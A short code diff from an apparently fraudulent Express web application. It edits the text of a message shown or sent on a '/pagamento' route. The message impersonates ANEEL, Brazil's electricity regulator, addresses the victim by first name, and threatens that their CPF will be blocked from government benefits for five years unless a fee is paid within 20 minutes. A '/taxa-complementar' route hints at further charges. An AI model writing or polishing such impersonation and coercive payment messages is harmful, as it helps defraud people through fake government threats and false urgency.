@@ -326,7 +326,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       switch (pagina) {
         case "/pagamento":
-          mensagem = `ANEEL Informa: ${primeiroNome}, a TRE foi gerada. Pague em até 20 minutos ou seu CPF será bloqueado e você ficará impedido de receber qualquer benefício do governo por até 5 anos.`;
+          mensagem = `ANEEL Informa: ${primeiroNome}, a TRE foi gerada. Pague em até 20 min ou seu CPF será bloqueado para benefícios do governo por até 5 anos.`;
           break;
           
         case "/taxa-complementar":
